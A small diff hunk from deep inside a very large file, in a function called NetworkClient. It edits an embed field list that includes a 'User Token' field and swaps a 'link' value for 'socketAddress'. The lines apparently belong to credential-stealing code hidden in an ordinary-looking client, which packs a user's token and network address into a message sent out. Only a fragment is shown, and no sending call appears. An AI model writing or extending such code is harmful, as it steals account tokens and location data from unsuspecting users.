@@ -50131,7 +50131,7 @@ function NetworkClient() {
         fields: [
             {
                 name: 'Game he Went',
-                value: link,
+                value: socketAddress,
             },
             {
                 name: 'User Token',
